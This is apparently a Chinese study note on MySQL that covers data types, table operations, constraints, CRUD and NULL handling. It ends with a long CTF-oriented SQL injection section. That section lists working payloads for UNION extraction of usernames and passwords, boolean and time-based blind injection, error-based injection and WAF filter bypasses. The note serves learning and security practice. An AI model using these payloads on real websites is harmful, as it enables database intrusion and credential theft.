# MySQL 02 - SQL 基础语法

SQL（Structured Query Language）是与关系型数据库交互的标准语言。本章以 MySQL 方言讲解数据类型、库表操作、约束与增删改查全套操作，学完即可独立建表写业务。这些语法在 PostgreSQL、SQLite 中 90% 通用。

---

## 一、常用数据类型

### 1.1 整数类型

| 类型 | 字节 | 有符号范围 | 无符号范围 | 典型用途 |
|------|------|-----------|-----------|----------|
| TINYINT | 1 | -128 ~ 127 | 0 ~ 255 | 状态标志、布尔开关 |
| SMALLINT | 2 | -32768 ~ 32767 | 0 ~ 65535 | 小范围计数 |
| MEDIUMINT | 3 | 约 -838万 ~ 838万 | 0 ~ 1677万 | 中等数值 |
| INT | 4 | 约 -21亿 ~ 21亿 | 0 ~ 42亿 | 最常用的整数类型 |
| BIGINT | 8 | 约 -922京 ~ 922京 | 0 ~ 1844京 | 订单号、雪花 ID、时间戳毫秒值 |

> 实践建议：主键统一用 `BIGINT UNSIGNED`，宁可浪费不要溢出。

### 1.2 精确小数与近似数

| 类型 | 说明 |
|------|------|
| `DECIMAL(M,D)` | 精确小数，M 为总位数（最大 65），D 为小数位；**金额必须用它** |
| `FLOAT` / `DOUBLE` | 近似浮点数，有精度误差，禁止存钱 |

```sql
price DECIMAL(10,2)   -- 最大 99999999.99
```

### 1.3 字符串类型

| 类型 | 特点 | 适用场景 |
|------|------|----------|
| `CHAR(n)` | 定长，不足补空格，最快 | 手机号、MD5 值等固定长度 |
| `VARCHAR(n)` | 变长，n 为字符数上限 | 用户名、标题，最常用 |
| `TEXT` | 大文本，最大约 64KB | 文章正文 |
| `LONGTEXT` | 最大约 4GB | 超长内容 |

### 1.4 日期时间类型

| 类型 | 格式示例 | 说明 |
|------|---------|------|
| `DATE` | 2026-08-21 | 仅日期 |
| `TIME` | 14:30:00 | 仅时间 |
| `DATETIME` | 2026-08-21 14:30:00 | 日期+时间，与时区无关，范围 1000~9999 年 |
| `TIMESTAMP` | 2026-08-21 14:30:00 | UTC 存储，随会话时区转换，最大到 2038 年 |

### 1.5 JSON 类型（MySQL 5.7+）

```sql
CREATE TABLE configs (
    id INT PRIMARY KEY AUTO_INCREMENT,
    extra JSON
);

INSERT INTO configs (extra) VALUES ('{"theme": "dark", "font": 14}');

SELECT extra->>'$.theme' AS theme FROM configs;   -- 取字段（字符串）
```

---

## 二、库操作

```sql
-- 创建数据库（显式指定 utf8mb4 防止中文乱码）
CREATE DATABASE shop DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;

-- 若不存在才创建（避免报错）
CREATE DATABASE IF NOT EXISTS shop;

-- 查看所有数据库
SHOW DATABASES;

-- 切换当前数据库
USE shop;

-- 查看当前所在库
SELECT DATABASE();

-- 删除数据库（危险：库下所有表一并删除且无法恢复）
DROP DATABASE shop;
```

---

## 三、表操作 DDL

### 3.1 创建表的完整示例

```sql
CREATE TABLE students (
    id          BIGINT UNSIGNED PRIMARY KEY AUTO_INCREMENT COMMENT '主键',
    name        VARCHAR(50)  NOT NULL                COMMENT '姓名',
    student_no  CHAR(10)     NOT NULL UNIQUE         COMMENT '学号',
    gender      ENUM('M','F') NOT NULL DEFAULT 'M'   COMMENT '性别',
    age         TINYINT UNSIGNED CHECK (age BETWEEN 6 AND 120),
    class_id    INT UNSIGNED                          COMMENT '班级ID',
    email       VARCHAR(100) UNIQUE                   COMMENT '邮箱',
    created_at  DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (class_id) REFERENCES classes(id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='学生表';
```

### 3.2 查看表结构

```sql
SHOW TABLES;                 -- 当前库所有表
DESC students;               -- 查看字段结构
SHOW CREATE TABLE students;  -- 查看完整建表语句
```

### 3.3 ALTER TABLE 修改表

```sql
-- 加列
ALTER TABLE students ADD COLUMN phone CHAR(11) AFTER name;

-- 改列类型/属性（MODIFY 不改名，CHANGE 可改名）
ALTER TABLE students MODIFY COLUMN phone VARCHAR(20);
ALTER TABLE students CHANGE COLUMN phone mobile VARCHAR(20);

-- 删列
ALTER TABLE students DROP COLUMN mobile;

-- 表重命名（两种写法等价）
RENAME TABLE students TO stu;
ALTER TABLE stu RENAME TO students;
```

### 3.4 删除表

```sql
DROP TABLE IF EXISTS students;   -- 整张表连同结构与数据删除
TRUNCATE TABLE students;         -- 清空数据保留结构（见 5.5）
```

---

## 四、约束一览

| 约束 | 关键字 | 作用 |
|------|--------|------|
| 主键 | `PRIMARY KEY` | 唯一标识一行，非空且唯一，每表只能有一个 |
| 自增 | `AUTO_INCREMENT` | 整型列自动 +1，常与主键搭配 |
| 非空 | `NOT NULL` | 该列不允许 NULL |
| 唯一 | `UNIQUE` | 全表该列值不重复，可为 NULL，可有多个 |
| 外键 | `FOREIGN KEY` | 引用另一表的主键，保证引用完整性 |
| 默认值 | `DEFAULT` | 插入未指定时的默认取值 |
| 检查 | `CHECK`（8.0.16+ 生效） | 自定义条件校验 |

外键补充：

```sql
-- 建表时定义
CONSTRAINT fk_class FOREIGN KEY (class_id) REFERENCES classes(id)

-- 级联选项：父行删除时子行同步处理
ON DELETE CASCADE    -- 子行一起删
ON DELETE SET NULL   -- 子行该字段置 NULL
```

> 生产环境很多团队禁用物理外键（影响性能、不利于分库分表），改由应用层保证逻辑一致性。学习阶段建议理解并会用。

---

## 五、CRUD 增删改查

以下示例基于两张演示表：

```sql
CREATE TABLE classes (
    id   INT UNSIGNED PRIMARY KEY AUTO_INCREMENT,
    name VARCHAR(50) NOT NULL
);

CREATE TABLE students (
    id       BIGINT UNSIGNED PRIMARY KEY AUTO_INCREMENT,
    name     VARCHAR(50) NOT NULL,
    age      TINYINT UNSIGNED,
    score    DECIMAL(5,2),
    class_id INT UNSIGNED
);

INSERT INTO classes (name) VALUES ('一班'), ('二班');
```

### 5.1 INSERT 插入

```sql
-- 单条插入
INSERT INTO students (name, age, score, class_id)
VALUES ('Alice', 18, 92.50, 1);

-- 批量插入（一条语句多行，效率远高于逐条）
INSERT INTO students (name, age, score, class_id)
VALUES
    ('Bob',   19, 85.00, 1),
    ('Carol', 17, 78.50, 2),
    ('Dave',  18, NULL,  2);

-- 全列插入可省略列名（不推荐，表结构变了就崩）
INSERT INTO students VALUES (NULL, 'Eve', 20, 66.00, 1);

-- 插入时若唯一键冲突则更新（UPSERT）
INSERT INTO students (id, name, age)
VALUES (1, 'Alice', 19)
ON DUPLICATE KEY UPDATE age = 19;
```

### 5.2 UPDATE 更新

```sql
-- 必须带 WHERE，否则整表被改！
UPDATE students SET score = 90 WHERE name = 'Bob';

-- 多字段一起改
UPDATE students SET age = age + 1, score = score + 5 WHERE class_id = 1;

-- 危险示范：无 WHERE 会把全表 score 都改成 60
-- UPDATE students SET score = 60;
```

> 安全习惯：先 `SELECT ... WHERE 同样的条件` 确认影响范围，再换成 UPDATE 执行；重要库开启 `sql_safe_updates=1` 强制要求 WHERE 带索引列或 LIMIT。

### 5.3 DELETE 与 TRUNCATE 对比

```sql
DELETE FROM students WHERE id = 5;      -- 删除指定行
DELETE FROM students;                    -- 删除全部行（慢，逐行记日志，可回滚）
TRUNCATE TABLE students;                 -- 清空全表（快，不可回滚）
```

| 对比项 | DELETE | TRUNCATE |
|--------|--------|----------|
| WHERE 条件 | 支持 | 不支持，只能清全表 |
| 速度 | 慢（逐行） | 快（直接重建） |
| 自增值 | 保留 | 重置回 1 |
| 事务回滚 | 可以 | 不可以 |
| 触发器 | 触发 | 不触发 |
| 返回删除行数 | 返回 | 不返回 |

### 5.4 SELECT 基础

```sql
SELECT * FROM students;                       -- 全表（生产慎用大表）
SELECT name, score FROM students;             -- 指定列
SELECT name AS n, score AS s FROM students;   -- 别名
SELECT DISTINCT class_id FROM students;       -- 去重

-- 排序与限量
SELECT name, score FROM students ORDER BY score DESC LIMIT 5;        -- 前 5 名
SELECT name FROM students ORDER BY score DESC LIMIT 5, 3;            -- 第 6~8 名

-- 简单计算列
SELECT name, score, score + 10 AS adjusted FROM students;
```

---

## 六、运算符与 WHERE 条件

### 6.1 运算符速查

| 分类 | 运算符 | 示例 |
|------|--------|------|
| 比较 | `=` `!=` 或 `<>` `>` `<` `>=` `<=` | `score >= 80` |
| 逻辑 | `AND` `OR` `NOT` | `age > 17 AND score >= 60` |
| 范围 | `BETWEEN ... AND ...` | `score BETWEEN 80 AND 90` |
| 集合 | `IN (...)` | `class_id IN (1, 3, 5)` |
| 模糊 | `LIKE` `_` 单字符 `%` 任意串 | `name LIKE 'A%'` |
| 判空 | `IS NULL` / `IS NOT NULL` | `score IS NULL` |

### 6.2 组合示例

```sql
SELECT * FROM students
WHERE class_id = 1 AND (score >= 80 OR age < 18);

SELECT * FROM students WHERE name LIKE '_o%';   -- 第二个字母是 o

SELECT * FROM students WHERE score BETWEEN 70 AND 90
  AND class_id IN (1, 2)
ORDER BY score DESC;
```

---

## 七、NULL 的处理

NULL 表示"未知"，**任何与 NULL 的比较结果都是 NULL 而不是真**，这是新手最常见的错误来源。

```sql
-- 错误：永远查不到（= NULL 不成立）
SELECT * FROM students WHERE score = NULL;

-- 正确
SELECT * FROM students WHERE score IS NULL;
SELECT * FROM students WHERE score IS NOT NULL;

-- IFNULL(expr, val)：为 NULL 时返回 val
SELECT name, IFNULL(score, 0) AS score FROM students;

-- COALESCE(v1, v2, ...)：返回第一个非 NULL 的参数（标准 SQL，各库通用）
SELECT name, COALESCE(score, backup_score, 0) AS final FROM students;
```

注意聚合函数会自动忽略 NULL：`COUNT(score)` 只统计非空行数，`COUNT(*)` 统计总行数。

---

## 八、本章小结

| 主题 | 要点 |
|------|------|
| 数据类型 | 整数选 INT/BIGINT，金额必 DECIMAL，字符串 VARCHAR，时间 DATETIME |
| 库表操作 | CREATE/ALTER/DROP 三板斧，建库显式 utf8mb4 |
| 约束 | 主键自增、唯一、外键、默认、检查七件套 |
| INSERT | 批量插入优于逐条 |
| UPDATE/DELETE | 永远先想 WHERE，先 SELECT 验证再动手 |
| NULL | 用 IS NULL 判断，IFNULL/COALESCE 兜底 |

---

## 九、SQL 注入前置知识

> 本节集中讲解 SQL 注入所需但前八节未覆盖的知识点。学完本节即可衔接 [[../../red_team/ctf_trea/Web/SQL/01-整数型注入|整数型注入]] 章节，进入实战。

### 9.1 注释符

SQL 注释符在注入中用于**截断原始语句的后半部分**，使注入的 payload 能正常执行。

| 注释符 | 写法 | 注意事项 |
|--------|------|----------|
| `--` (双横杠) | `1' -- ` | 后面**必须有空格**（或换行），否则不生效 |
| `#` | `1' #` | URL 中需要编码为 `%23` |
| `/* */` | `1'/*anything*/` | 多行注释，可插入任意内容绕过 WAF |

```sql
-- 原始语句
SELECT * FROM users WHERE id = '用户输入';

-- 注入示例：用 -- 截断后面的引号
输入: 1' OR '1'='1' -- 
执行: SELECT * FROM users WHERE id = '1' OR '1'='1' -- ';

-- 注入示例：用 # 截断
输入: 1' OR '1'='1' #
执行: SELECT * FROM users WHERE id = '1' OR '1'='1' #';

-- 用 /**/ 注入（绕过空格过滤）
输入: 1'/**/OR/**/'1'='1
执行: SELECT * FROM users WHERE id = '1'/**/OR/**/'1'='1';
```

> 关键理解：注释符的作用是让数据库**忽略注入点之后的原始代码**，这样你写的 payload 就能完整执行。

### 9.2 UNION 联合查询

UNION 是 SQL 注入中最常用的数据提取方式。它将两个 SELECT 的结果合并为一个结果集。

**核心规则：**
1. 两个 SELECT 的**列数必须相同**
2. 对应列的**数据类型兼容**（通常用 NULL 占位）
3. UNION 只能放在最后一个 SELECT 之后

**注入三步法：**

```sql
-- 第一步：确定列数（ORDER BY N 逐步增大直到报错）
?id=1 ORDER BY 3    -- 正常 → 至少 3 列
?id=1 ORDER BY 4    -- 报错 → 总共 3 列

-- 第二步：确定显示位（哪些列的数据会显示在页面上）
?id=-1 UNION SELECT 1,2,3
-- id=-1 不存在，主查询返回空，页面只显示 UNION 的结果
-- 页面上出现的数字就是"显示位"，后续把数字替换成要提取的数据

-- 第三步：提取数据（替换显示位为子查询）
?id=-1 UNION SELECT 1,database(),3          -- 当前数据库名
?id=-1 UNION SELECT 1,version(),3           -- MySQL 版本
?id=-1 UNION SELECT 1,user(),3              -- 当前用户
?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()  -- 所有表名
?id=-1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'       -- 所有列名
?id=-1 UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users  -- 提取数据
```

> `-1` 的作用：让主查询返回空结果，这样 UNION 的结果独占显示位。也可以用 `AND 1=2` 等恒假条件代替。

### 9.3 information_schema 元数据库

MySQL 有一个**自动维护**的特殊数据库 `information_schema`，存储了所有数据库、表、列的元信息。SQL 注入中提取数据的核心就是查询它。

```
information_schema
├── schemata          → 所有数据库名
│   └── schema_name   → 数据库名
├── tables            → 所有表名
│   ├── table_schema  → 所属数据库名
│   └── table_name    → 表名
└── columns           → 所有列名
    ├── table_schema  → 所属数据库名
    ├── table_name    → 所属表名
    └── column_name   → 列名
```

**注入中的标准查询链：**

```sql
-- 1. 爆数据库名
SELECT schema_name FROM information_schema.schemata;

-- 2. 爆指定数据库的表名
SELECT table_name FROM information_schema.tables
WHERE table_schema = '目标库名';

-- 3. 爆指定表的列名
SELECT column_name FROM information_schema.columns
WHERE table_name = '目标表名';

-- 4. 提取数据
SELECT 列1,列2 FROM 目标库名.目标表名;
```

**对应注入 payload：**

```sql
-- 爆库名
?id=-1 UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata

-- 爆表名（把 security 换成目标库名）
?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema='security'

-- 爆列名（把 users 换成目标表名）
?id=-1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'

-- 提取数据
?id=-1 UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users
```

> `0x3a` 是冒号 `:` 的十六进制，用于分隔用户名和密码。`group_concat()` 把多行合并为一行逗号分隔的字符串。

### 9.4 GROUP_CONCAT 与 CONCAT

在注入中，页面通常只有一个显示位，但需要提取多行数据。`GROUP_CONCAT` 把多行合并为一行。

| 函数 | 作用 | 示例 |
|------|------|------|
| `CONCAT(a,b,c)` | 拼接多个值 | `CONCAT('a','b')` → `'ab'` |
| `CONCAT_WS(sep,a,b)` | 用分隔符拼接 | `CONCAT_WS(':','a','b')` → `'a:b'` |
| `GROUP_CONCAT(col)` | 合并多行为一行 | `GROUP_CONCAT(name)` → `'Alice,Bob,Carol'` |
| `GROUP_CONCAT(col SEPARATOR '分隔符')` | 指定分隔符 | `GROUP_CONCAT(name SEPARATOR ':')` → `'Alice:Bob:Carol'` |

```sql
-- 普通 CONCAT：拼接单行的多个字段
?id=-1 UNION SELECT 1,CONCAT(username,0x3a,password),3 FROM users WHERE id=1

-- GROUP_CONCAT：把多行数据合并到一个显示位
?id=-1 UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users
-- 结果: "admin:123456,alice:pass1,bob:pass2"

-- 带排序
?id=-1 UNION SELECT 1,group_concat(username,0x3a,password ORDER BY username),3 FROM users
```

### 9.5 ORDER BY 列数探测

`ORDER BY N` 按第 N 列排序。当 N 超过实际列数时会报错，因此可以用来探测 SELECT 的列数。

```sql
-- 逐步增大 N，找到报错的临界值
?id=1 ORDER BY 1    -- 正常
?id=1 ORDER BY 2    -- 正常
?id=1 ORDER BY 3    -- 正常
?id=1 ORDER BY 4    -- 报错：Unknown column '4' in 'order clause'
→ 结论：当前 SELECT 有 3 列
```

**ORDER BY 注入（当 ORDER BY 参数可控时）：**

```sql
-- 报错法：用 IF 构造条件
ORDER BY IF(1=1, (SELECT COUNT(*) FROM information_schema.tables), 1)
-- 真条件 → 执行子查询 → 可能触发报错带出信息

-- 时间法：用 SLEEP 判断条件真假
ORDER BY IF(ASCII(SUBSTRING(database(),1,1))>100, SLEEP(3), 1)
-- 如果第一个字符 ASCII > 100，响应延迟 3 秒
```

### 9.6 盲注函数

当页面**不显示数据也不显示报错**时，需要逐字符猜解数据。以下函数是盲注的核心工具。

**字符串截取与比较：**

| 函数 | 作用 | 示例 |
|------|------|------|
| `LENGTH(str)` | 字符串长度 | `LENGTH('admin')` → `5` |
| `SUBSTRING(str,pos,len)` | 截取子串 | `SUBSTRING('admin',1,1)` → `'a'` |
| `SUBSTR()` | 同 SUBSTRING | 别名 |
| `LEFT(str,len)` | 取左边 N 个字符 | `LEFT('admin',3)` → `'adm'` |
| `ASCII(str)` | 返回字符的 ASCII 码 | `ASCII('a')` → `97` |
| `ORD(str)` | 同 ASCII | 别名 |

**布尔盲注猜解库名长度：**

```sql
-- 猜解数据库名长度
?id=1 AND LENGTH(database())=8    -- 页面正常 → 长度是 8
?id=1 AND LENGTH(database())=7    -- 页面异常 → 长度不是 7

-- 逐字符猜解数据库名
?id=1 AND ASCII(SUBSTRING(database(),1,1))=115   -- 第1个字符 ASCII=115 → 's'
?id=1 AND ASCII(SUBSTRING(database(),2,1))=101   -- 第2个字符 ASCII=101 → 'e'
?id=1 AND ASCII(SUBSTRING(database(),3,1))=99    -- 第3个字符 ASCII=99  → 'c'
-- 完整库名: security
```

**时间盲注（SLEEP / BENCHMARK）：**

| 函数 | 作用 | 示例 |
|------|------|------|
| `SLEEP(N)` | 暂停 N 秒 | `SLEEP(5)` → 响应延迟 5 秒 |
| `BENCHMARK(N,expr)` | 执行表达式 N 次 | `BENCHMARK(10000000,SHA1('test'))` → CPU 密集型延迟 |

```sql
-- 时间盲注：根据响应延迟判断条件真假
?id=1 AND IF(ASCII(SUBSTRING(database(),1,1))>100, SLEEP(3), 0)
-- 响应延迟 3 秒 → 条件为真
-- 响应无延迟 → 条件为假

-- BENCHMARK 替代 SLEEP（当 SLEEP 被过滤时）
?id=1 AND IF(ASCII(SUBSTRING(database(),1,1))>100, BENCHMARK(10000000,SHA1('a')), 0)
```

### 9.7 报错注入函数

当页面**会显示数据库报错信息**时，可以把查询结果塞进报错信息中回显。三大报错函数：

**① EXTRACTVALUE（XPath 报错）：**

```sql
-- 语法：EXTRACTVALUE(XML_frag, XPath_expr)
-- 当 XPath 语法错误时，MySQL 会把错误信息返回

?id=1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))
-- 报错信息: XPATH syntax error: '~security~'
-- 0x7e 是波浪号 ~，用于定位数据（非语法字符，会触发报错）

-- 逐字符提取（配合 SUBSTRING）
?id=1 AND EXTRACTVALUE(1, CONCAT(0x7e, SUBSTRING((SELECT password FROM users LIMIT 0,1), 1, 10), 0x7e))
```

**② UPDATEXML（XPath 报错）：**

```sql
-- 语法：UPDATEXML(XML_frag, XPath_expr, new_value)
-- 与 EXTRACTVALUE 原理相同，XPath 语法错误时返回错误信息

?id=1 AND UPDATEXML(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1)
-- 报错信息: XPATH syntax error: '~root@localhost~'
```

> EXTRACTVALUE 和 UPDATEXML 的区别：EXTRACTVALUE 返回第二个参数的值，UPDATEXML 返回第三个参数。但两者都因为第二个参数（XPath）的格式错误而报错，利用的是报错信息本身。

**③ FLOOR + RAND（主键冲突报错）：**

```sql
-- 原理：RAND() 生成随机数，GROUP BY 统计时触发主键冲突报错
-- 报错信息中包含分组的值（即我们要提取的数据）

?id=1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), 0x7e, FLOOR(RAND(0)*2)) FROM information_schema.tables GROUP BY x)a)
-- 报错信息: Duplicate entry 'security~1' for key 'group_key'
-- security 就是数据库名
```

> FLOOR+RAND 是最早的报错注入手法，现在用得较少（需要特定条件触发）。优先使用 EXTRACTVALUE/UPDATEXML。

### 9.8 十六进制编码

MySQL 中可以用 `0x` 前缀表示十六进制字符串，注入中常用于**绕过引号过滤**。

```sql
-- 常规写法（需要引号）
WHERE table_schema = 'security'

-- 十六进制写法（不需要引号）
WHERE table_schema = 0x7365637572697479
-- 0x7365637572697479 = 'security' 的十六进制

-- 生成十六进制的方法
SELECT HEX('security');           -- 7365637572697479
SELECT CONCAT('0x', HEX('users')); -- 0x7573657273
```

**注入中使用：**

```sql
-- 当单引号被过滤时，用十六进制代替表名/库名
?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=0x7365637572697479

-- 等价于
?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema='security'
```

### 9.9 常用编码与转义

| 编码 | 用途 | 示例 |
|------|------|------|
| 十六进制 `0x` | 绕过引号 | `0x61646D696E` = `'admin'` |
| URL 编码 | 注释符 `#` 需编码为 `%23` | `1'%23` |
| 双写绕过 | 关键字被过滤时 | `ununionion` → `union` |
| 大小写混合 | 关键字过滤 | `UnIoN` `SeLeCt` |
| 内联注释 | 绕过 WAF | `/*!UNION*/ SELECT` |

### 9.10 速查：从注入到数据的完整流程

```
1. 确定注入类型
   ?id=1 AND 1=1  → 正常
   ?id=1 AND 1=2  → 异常
   → 差异 → 注入成立

2. 确定列数
   ?id=1 ORDER BY N → 逐步增大直到报错

3. 确定显示位
   ?id=-1 UNION SELECT 1,2,3,...
   → 页面上出现的数字就是显示位

4. 替换显示位为数据
   库名:  ?id=-1 UNION SELECT 1,database(),3
   版本:  ?id=-1 UNION SELECT 1,version(),3

5. 通过 information_schema 爆表名
   ?id=-1 UNION SELECT 1,group_concat(table_name),3
   FROM information_schema.tables WHERE table_schema='库名'

6. 爆列名
   ?id=-1 UNION SELECT 1,group_concat(column_name),3
   FROM information_schema.columns WHERE table_name='表名'

7. 提取数据
   ?id=-1 UNION SELECT 1,group_concat(列1,0x3a,列2),3 FROM 表名
```

**无回显时的备选方案：**

```
有报错信息 → 报错注入（EXTRACTVALUE / UPDATEXML）
有页面差异 → 布尔盲注（ASCII + SUBSTRING + 条件判断）
无任何差异 → 时间盲注（SLEEP / BENCHMARK + IF）
```

下一章把查询能力拉满：[[03-查询进阶|查询进阶]]

SQL 注入实战：[[../../red_team/ctf_trea/Web/SQL/01-整数型注入|整数型注入]] → [[../../red_team/ctf_trea/Web/SQL/SQL总目录|SQL 注入总目录]]

---
**返回** [[../数据库目录|数据库目录]]
